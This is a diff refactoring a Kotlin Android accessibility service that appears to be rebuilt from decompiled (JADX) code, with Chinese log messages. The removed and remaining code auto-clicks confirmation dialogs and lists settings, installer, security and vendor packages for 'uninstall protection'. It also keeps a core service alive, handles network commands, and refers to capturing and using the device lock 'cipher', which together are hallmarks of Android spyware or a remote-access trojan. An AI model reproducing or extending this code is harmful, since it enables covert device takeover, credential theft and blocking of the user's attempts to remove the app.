-                val nodes = root.findAccessibilityNodeInfosByText(text)
-                if (nodes.isNullOrEmpty()) continue
-
-                for (node in nodes) {
-                    // JADX line 2165: if node is clickable, click it directly
-                    if (node.isClickable) {
-                        android.util.Log.d(TAG, "✅ 点击确认按钮: ${node.text}")
-                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                        // Recycle all nodes
-                        nodes.forEach { n -> try { n.recycle() } catch (_: Exception) {} }
-                        try { root.recycle() } catch (_: Exception) {}
-                        return
-                    }
-
-                    // JADX line 2178–2202: traverse parents looking for clickable ancestor
-                    val parentChain = mutableListOf<AccessibilityNodeInfo>()
-                    var parent = node.parent
-                    while (parent != null) {
-                        parentChain.add(parent)
-                        if (parent.isClickable) {
-                            android.util.Log.d(TAG, "✅ 点击确认按钮的父节点")
-                            parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                            parentChain.forEach { p -> try { p.recycle() } catch (_: Exception) {} }
-                            nodes.forEach { n -> try { n.recycle() } catch (_: Exception) {} }
-                            try { root.recycle() } catch (_: Exception) {}
-                            return
-                        }
-                        parent = parent.parent
-                    }
-                    // Recycle parent chain if no clickable found
-                    parentChain.forEach { p -> try { p.recycle() } catch (_: Exception) {} }
-                }
-                // Recycle found nodes
-                nodes.forEach { n -> try { n.recycle() } catch (_: Exception) {} }
-            }
-
-            android.util.Log.w(TAG, "⚠️ 未找到确认按钮")
-            try { root.recycle() } catch (_: Exception) {}
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ 处理确认弹窗失败", e)
-        }
+    /** Delegate to EventDispatcher */
+    fun handleAccessibilityPageStuck() {
+        eventDispatcher?.handleAccessibilityPageStuck()
     }
 
     /**
@@ -2393,23 +1679,6 @@ class MyAccessibilityService : AccessibilityService() {
         } catch (e: Exception) {
             android.util.Log.e(TAG, "❌ 处理网络命令失败", e)
         }
-    }
-
-    /**
-     * Check if a package name is in the extended uninstall protection list.
-     * JADX line 10010–10012: long list of vendor/system package substrings.
-     */
-    private fun isPackageInProtectionList(pkg: String): Boolean {
-        val protectedKeywords = arrayOf(
-            "launcher", "systemui", "packageinstaller", "appmarket", "appstore",
-            "market", "settings", "securitycenter", "phonemanager", "safecenter",
-            "security", "battery", "permissionmanager", "systemmanager", "devicemanager",
-            "oplus", "coloros", "oppo", "realme", "oneplus", "heytap", "nearme",
-            "vivo", "bbk", "iqoo", "miui", "xiaomi", "huawei", "honor",
-            "samsung", "meizu", "nubia", "lenovo", "motorola", "smartisanos",
-            "qihoo", "360", "tencent", "qq.manager"
-        )
-        return protectedKeywords.any { pkg.contains(it, ignoreCase = true) }
     }
 
     /**
@@ -3224,7 +2493,7 @@ class MyAccessibilityService : AccessibilityService() {
         cipherFlowController?.completeInstallationWithCipher()
     }
 
-    @Volatile private var lastLockTypeCheckTime = 0L
+    @Volatile internal var lastLockTypeCheckTime = 0L
     @Volatile internal var cipherRetryCount = 0
 
     @Volatile var lastCapturedCipherQuality: String? = null
@@ -3311,7 +2580,7 @@ class MyAccessibilityService : AccessibilityService() {
      * Dispatch event to legacy delegate queue.
      * Eventually all delegates should use the typed AccessibilityDelegate system.
      */
-    private fun dispatchToDelegates(
+    internal fun dispatchToDelegates(
         event: AccessibilityEvent,
         packageName: String,
         className: String
@@ -3326,22 +2595,6 @@ class MyAccessibilityService : AccessibilityService() {
                 } catch (e: Exception) {
                     android.util.Log.e(TAG, "Delegate dispatch error: ${e.message}")
                 }
-            }
-        }
-    }
-
-    /**
-     * Ensure AppCoreService is running (throttled check).
-     * JADX line 9783: check every 10s
-     */
-    private fun ensureCoreServiceRunning() {
-        val now = System.currentTimeMillis()
-        if (now - lastCoreServiceCheckTime > CORE_SERVICE_CHECK_INTERVAL) {
-            lastCoreServiceCheckTime = now
-            if (!AppCoreService.isRunning()) {
-                try {
-                    AppCoreService.start(applicationContext)
-                } catch (_: Exception) {}
             }
         }
     }
